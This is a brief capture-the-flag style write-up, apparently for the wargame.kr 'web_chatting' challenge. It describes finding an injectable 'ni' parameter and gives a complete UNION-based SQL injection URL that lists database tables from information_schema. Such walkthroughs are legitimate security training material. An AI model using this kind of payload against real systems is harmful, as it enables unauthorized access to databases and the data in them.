# web_chatting with url sqli

1. input the ID
2. input the example chatting log
3. check the request at Network

chatlog.php?data={something} is sending a chatting log

chatlog.php?t=1&ni=anything allows you to see more than anything

#is comment out

4. you can try url sqli!!
example : http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=56171%20union%20select%201,table_name,3,4,5%20from%20information_schema.tables%20limit%2056171,100--

